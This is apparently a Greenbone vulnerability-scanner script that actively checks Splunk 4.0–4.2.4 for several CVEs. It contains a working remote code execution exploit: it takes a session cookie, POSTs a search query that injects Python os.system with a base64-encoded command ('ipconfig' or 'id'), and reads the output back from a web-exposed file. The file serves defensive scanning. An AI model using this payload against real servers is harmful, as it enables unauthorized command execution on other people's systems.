# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:splunk:splunk";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902801");
  script_version("2024-01-25T14:38:15+0000");
  script_tag(name:"last_modification", value:"2024-01-25 14:38:15 +0000 (Thu, 25 Jan 2024)");
  script_tag(name:"creation_date", value:"2011-12-22 11:11:11 +0530 (Thu, 22 Dec 2011)");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2011-4642", "CVE-2011-4643", "CVE-2011-4644", "CVE-2011-4778");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Splunk 4.0 - 4.2.4 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_splunk_http_detect.nasl");
  script_mandatory_keys("splunk/http/detected");
  script_require_ports("Services/www", 8000, 8089);

  script_tag(name:"summary", value:"Splunk is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends multiple HTTP GET requests and checks the responses.");

  script_tag(name:"insight", value:"The following vulnerabilities exist:

  - The application allows users to perform search actions via HTTP requests without performing
  proper validity checks to verify the requests. This can be exploited to execute arbitrary code
  when a logged-in administrator visits a specially crafted web page.

  - Certain unspecified input is not properly sanitised before being returned to the user. This can
  be exploited to execute arbitrary HTML and script code in a user's browser session in context of
  an affected site.

  - Certain input passed to the web API is not properly sanitised before being used to access
  files. This can be exploited to disclose the content of arbitrary files via directory traversal
  attacks.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to inject
  and execute arbitrary code and conduct cross-site scripting and cross-site request forgery
  attacks.");

  script_tag(name:"affected", value:"Splunk versions 4.0 through 4.2.4.");

  script_tag(name:"solution", value:"Update to version 4.2.5 or later.");

  script_xref(name:"URL", value:"http://www.sec-1.com/blog/?p=233");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51061");
  script_xref(name:"URL", value:"http://secunia.com/advisories/47232");
  script_xref(name:"URL", value:"http://www.splunk.com/view/SP-CAAAGMM");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18245");
  script_xref(name:"URL", value:"http://tools.cisco.com/security/center/viewAlert.x?alertId=24805");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("url_func.inc");
include("port_service_func.inc");

function exploit(command , xsplunk, session, host)
{
  url = "/en-GB/api/search/jobs";

  postData = string(
               "search=search%20index%3D_internal%20source%3D%2Asplunkd.",
               "log%20%7Cmappy%20x%3Deval%28%22sys.modules%5B%27os%27%5D",
               ".system%28base64.b64decode%28%27", command, "aXBjb25maWc",
               "%2BImM6XHByb2dyYW0gZmlsZXNcc3BsdW5rXHNoYXJlXHNwbHVua1xzZ",
               "WFyY2hfbXJzcGFya2xlXGV4cG9zZWRcanNcLnRtcCI%3D%27%29%29%2",
               "2%29&status_buckets=300&namespace=search&ui_dispatch_app",
               "=search&ui_dispatch_view=flashtimeline&auto_cancel=100&r",
               "equired_field_list=*&earliest_time=&latest_time="
               );

  req = string(
               "POST ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Accept-Encoding: identity\r\n",
               "X-Splunk-Session: ", xsplunk, "\r\n",
               "Cookie: ", session, "\r\n",
               "X-Requested-With: XMLHttpRequest\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(postData), "\r\n",
               "\r\n", postData
             );
  return req;
}

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

host = http_host_name(port:port);

# nb: The Splunkd Web API port
dport = 8089;
if (!get_port_state(dport))
  exit(0);

req = http_get(port: dport, item: "/services/server/info/server-info");
server_info = http_keepalive_send_recv(port: dport, data: req);

os = eregmatch(pattern: 'name="os_name">(.+)<', string: server_info);
if (isnull(os[1]))
  exit(0);

os = os[1];

req = http_get(port: port, item: "/en-GB/account/login");
res = http_keepalive_send_recv(port: port, data: req);

session = eregmatch(pattern: "Set-Cookie: (session[^;]*);", string: res);
if (isnull(session[1]))
  exit(0);

session = session[1];

xsplunk = eregmatch(pattern: "=([a-zA-Z0-9]+)", string: session);
if (isnull(session[1]))
  exit(0);

xsplunk = xsplunk[1];

if ("windows" >< tolower(os)) {
  tmp = string('>"', "c:\\program files\\splunk\\share\\splunk\\search_",
               "mrsparkle\\exposed\\js\\.tmp",'"');
  command = urlencode(str: base64(str: string("ipconfig", tmp)));
  req = exploit(command: command, xsplunk: xsplunk, session: session, host: host);
} else {
  tmp = ">/opt/splunk/share/splunk/search_mrsparkle/exposed/js/.tmp";
  command = urlencode(str: base64(str: string("id", tmp)));
  req = exploit(command: command, xsplunk: xsplunk, session: session, host: host);
}

res = http_keepalive_send_recv(port: port, data: req);

sleep(5);

req = http_get(port: port, item: "/en-US/static/@105575/js/.tmp");
res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

if (egrep(pattern: "Subnet Mask|uid=[0-9]+.*gid=[0-9]+", string: res)) {
  report = 'It was possible to execute a system command.\n\nResult:\n\n' + chomp(res);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
